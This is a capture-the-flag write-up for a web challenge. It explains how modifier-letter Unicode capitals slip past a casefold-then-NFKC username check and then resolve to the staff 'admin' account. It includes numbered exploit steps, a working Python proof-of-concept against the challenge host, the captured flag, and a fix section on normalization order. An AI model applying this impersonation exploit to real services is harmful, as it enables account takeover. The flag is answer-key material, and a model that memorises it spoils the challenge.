# Harborlight Forums (Web, 300 pts, Medium)

**Target:** `91.99.207.116:16305`
**Flag:** `ctf7{casefold_then_nfkc_is_not_idempotent}`

## Summary

The service exposes:
- `GET /api/username/check?name=` — availability + canonical form
- `POST /api/signup` — `{"username": ...}` -> member session token
- `POST /api/login` — staff login
- `GET /api/me` — identity/role from `Authorization: Bearer <token>`
- `GET /api/admin/console` — admin-only

The landing page states the canonicalization scheme explicitly: usernames are
made "case-insensitive and Unicode-aware" via **case-fold, then NFKC**
("the nodeprep way"), claiming this makes e.g. `Bob`, `BOB`, and the fullwidth
`ｂｏｂ` a single identity, and that nobody can impersonate staff.

Ordinary tests (uppercase `ADMIN`, fullwidth `ＡＤＭＩＮ`, Cyrillic homoglyphs,
combining marks, superscript/roman-numeral compatibility chars, whitespace,
null bytes) were all correctly rejected or correctly canonicalized to a
different/colliding string — the case-fold+NFKC pipeline is robust against
all of the "usual suspect" Unicode confusables.

## Root cause

**Case-fold then NFKC is not idempotent for Unicode "Modifier Letter" capital
forms** (block U+1D2C-U+1D6A, e.g. `ᴬ ᴮ ᴰ ᴱ ... ᴺ`). These characters are
superscript-capital-looking letters whose `str.casefold()` is a no-op (they
have no defined case mapping — they are category `Lm`, not `Lu`/`Ll`), but
whose NFKC decomposition maps them to the ASCII **uppercase** base letter.

So for the string built from modifier letters spelling "admin"
(`\u1D2C\u1D30\u1D39\u1D35\u1D3A` = `ᴬᴰᴹᴵᴺ`):

- `casefold(s)` → `ᴬᴰᴹᴵᴺ` (unchanged — no case mapping exists for `Lm`)
- `NFKC(casefold(s))` → `"ADMIN"` (NFKC decomposes each modifier letter to its uppercase ASCII base)

This is exactly backwards from what "case-insensitive, Unicode-aware"
canonicalization needs: applying NFKC *after* casefold re-introduces
uppercase letters that casefold was supposed to have already eliminated.
Doing it in the mathematically correct order — `casefold(NFKC(s))` — instead
collapses the same string straight to lowercase `"admin"`.

The `/api/username/check` and `/api/signup` availability/uniqueness logic
only strips the trivial case/width/homoglyph collisions it was built to catch
(case, fullwidth, etc.), and does not re-casefold its own NFKC output — so it
reports the modifier-letter string as canonical `"ADMIN"`, distinct from the
reserved `"admin"`, and lets signup proceed. The resulting account's stored
username is literally `"ADMIN"`.

Whatever logic backs `/api/me` / role resolution, however, treats the
username `"ADMIN"` as equal to the staff account `"admin"` (same uppercase
collapse happens globally once the string is stored as plain ASCII — there's
no more Unicode trickery left to hide behind at that point, it's just the
literal string `"ADMIN"`, which case-insensitively **is** `"admin"`). The
account is granted `role: admin`.

## Exploit steps

1. `GET /api/username/check?name=admin` → confirmed `admin` is the real
   staff/reserved target (`"that name belongs to a Harborlight staff
   member"`).
2. Built the Unicode "Modifier Letter" capital spelling of `admin`:
   `ᴬᴰᴹᴵᴺ` = `U+1D2C U+1D30 U+1D39 U+1D35 U+1D3A`.
3. `GET /api/username/check?name=ᴬᴰᴹᴵᴺ` → `{"available": true, "canonical":
   "ADMIN", ...}` — passes as a *different* name from `admin`.
4. `POST /api/signup {"username": "ᴬᴰᴹᴵᴺ"}` → `200`, returns a member
   session token; `username` field in the response is already `"ADMIN"`.
5. `GET /api/me` with that token → `{"role": "admin", "username": "ADMIN"}`.
6. `GET /api/admin/console` with that token → `200`:
   ```json
   {"pinned_note": "ctf7{casefold_then_nfkc_is_not_idempotent}", "welcome": "ADMIN"}
   ```

## PoC script

```python
import urllib.request, urllib.parse, json

base = "http://91.99.207.116:16305"
mod = {'a':'\u1D2C', 'd':'\u1D30', 'm':'\u1D39', 'i':'\u1D35', 'n':'\u1D3A'}
s = ''.join(mod[c] for c in "admin")  # 'ᴬᴰᴹᴵᴺ'

def req(method, path, body=None, token=None):
    headers = {"Content-Type": "application/json"} if body else {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode() if body else None
    r = urllib.request.Request(base + path, data=data, headers=headers, method=method)
    with urllib.request.urlopen(r) as resp:
        return json.loads(resp.read())

print(req("GET", "/api/username/check?name=" + urllib.parse.quote(s)))
signup = req("POST", "/api/signup", {"username": s})
print(signup)
token = signup["token"]
print(req("GET", "/api/me", token=token))
print(req("GET", "/api/admin/console", token=token))
```

## Lesson / fix

Unicode normalization order matters and is **not commutative** with
case-folding for every character class. `casefold(NFKC(x))` and
`NFKC(casefold(x))` differ for characters in categories whose case mapping
is undefined (e.g. `Lm` modifier letters) but whose NFKC compatibility
decomposition changes case (maps to an uppercase base letter). The correct,
idempotent nodeprep-style pipeline normalizes first, then case-folds — and
should iterate/re-apply until a fixed point, or at minimum perform
case-folding as the *last* step before the uniqueness/authorization
comparison, never before NFKC.
